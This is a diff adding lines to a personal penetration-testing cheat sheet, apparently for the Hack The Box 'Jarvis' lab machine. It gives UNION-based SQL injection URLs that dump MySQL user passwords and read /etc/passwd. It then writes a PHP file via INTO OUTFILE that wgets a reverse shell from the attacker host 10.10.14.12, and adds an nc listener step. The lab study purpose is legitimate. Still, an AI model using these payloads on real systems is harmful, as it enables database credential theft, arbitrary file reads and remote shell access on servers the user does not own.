@@ -59,6 +59,15 @@ Manual SQL Injection: https://pentestlab.blog/2012/12/24/sql-injection-authentic
 	- get username: http://10.10.10.143/room.php?cod=9999 union select 1,(select password FROM mysql.user),3,4,5,6,7
 		- http://10.10.10.143/room.php?cod=9999 union select 1,(select group_concat(host,user,password) FROM mysql.user),3,4,5,6,7
 		- http://10.10.10.143/room.php?cod=9999 union select 1,LOAD_FILE('/etc/passwd'),3,4,5,6,7
+	- To upload a shell: http://10.10.10.143/room.php?cod=9999 union select 1,(select '<?php exec(\"wget -O /var/www/html/shell.php http://10.10.14.12:5555/php-reverse-shell.php\");?>'),3,4,5,6,7 INTO OUTFILE '/var/www/html/test4.php'
+		- Start simple http server to serve your php shell
+		- browse to http://10.10.10.143/test4.php
+		- nc -lncvp 1234
+		- browse to httP;//10.10.10.143/shell.php
+		
+Exploit systemctl on Linux: https://ranakhalil101.medium.com/hack-the-box-jarvis-writeup-w-o-metasploit-9f4cc7907c87	
+		
+		
 		
 		
 masscan: sudo masscan -e tun0 -p1-65535 --rate=1000 10.10.10.43
